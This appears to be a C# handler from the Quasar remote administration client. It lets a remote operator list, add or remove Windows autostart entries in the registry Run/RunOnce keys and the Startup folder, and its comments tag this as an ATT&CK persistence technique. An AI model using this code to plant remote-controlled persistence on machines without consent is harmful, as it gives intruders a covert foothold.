using Microsoft.Win32;
using Quasar.Client.Extensions;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Quasar.Client.Messages
{
    public class StartupManagerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetStartupItems ||
                                                             message is DoStartupItemAdd ||
                                                             message is DoStartupItemRemove;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetStartupItems msg:
                    Execute(sender, msg);
                    break;
                case DoStartupItemAdd msg:
                    Execute(sender, msg);
                    break;
                case DoStartupItemRemove msg:
                    Execute(sender, msg);
                    break;
            }
        }

        /// <summary>
        /// Executes the GetStartupItems request to enumerate start-up items in the startup folder and from the following registry keys:<br/>
        /// - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run <br/>
        /// - HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce <br/>
        /// - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce <br/>
        /// - HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce <br/>
        /// - HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run <br/>
        /// - HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce <br/>
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// </remarks>
        private void Execute(ISender client, GetStartupItems message)
        {
            Logger.Debug("Handling GetStartupItems request.");
            try
            {
                List<Common.Models.StartupItem> startupItems = new List<Common.Models.StartupItem>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunX86 });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnceX86 });
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Common.Models.StartupItem
                    { Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu }));
                }

                client.Send(new GetStartupItemsResponse { StartupItems = startupItems });
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling GetStartupItems request: " + ex.ToString());
                client.Send(new SetStatus { Message = $"Getting Autostart Items failed: {ex.Message}" });
            }
        }

        /// <summary>
        /// Executes the DoStartupItemAdd request to add a startup item to the startup folder or one of the registry run keys
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// </remarks>
        private void Execute(ISender client, DoStartupItemAdd message)
        {
            Logger.Debug("Handling GetStartupItems request for startup item " + message.StartupItem.Name);
            try
            {
                switch (message.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        Logger.Debug("Adding startup item to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        Logger.Debug("Adding startup item to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        Logger.Debug("Adding startup item to HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        Logger.Debug("Adding startup item to HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineRunX86:
                        Logger.Debug("Adding startup item to HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnceX86:
                        Logger.Debug("Adding startup item to HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("Could not add value");
                        }
                        break;
                    case StartupType.StartMenu:
                        Logger.Debug("Adding startup item to startup folder.");
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            message.StartupItem.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + message.StartupItem.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + message.StartupItem.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling DoStartupItemAdd request: " + ex.ToString());
                client.Send(new SetStatus { Message = $"Adding Autostart Item failed: {ex.Message}" });
            }
        }

        /// <summary>
        /// Executes the DoStartupItemRemove request to remove a startup item from the startup folder or from one of the registry run keys
        /// </summary>
        /// <remarks>
        /// MITRE ATT&amp;CK Techniques:<br/>
        /// - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
        /// </remarks>
        private void Execute(ISender client, DoStartupItemRemove message)
        {
            Logger.Debug("Handling DoStartupItemRemove request for startup item " + message.StartupItem.Name);
            try
            {
                switch (message.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        Logger.Debug("Removing startup item from HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        Logger.Debug("Removing startup item from HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        Logger.Debug("Removing startup item from HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        Logger.Debug("Removing startup item from HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineRunX86:
                        Logger.Debug("Removing startup item from HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.LocalMachineRunOnceX86:
                        Logger.Debug("Removing startup item from HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce");
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
                        {
                            throw new Exception("Could not remove value");
                        }
                        break;
                    case StartupType.StartMenu:
                        Logger.Debug("Adding startup item from startup folder.");
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), message.StartupItem.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("File does not exist");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when handling DoStartupItemRemove request: " + ex.ToString());
                client.Send(new SetStatus { Message = $"Removing Autostart Item failed: {ex.Message}" });
            }
        }
    }
}
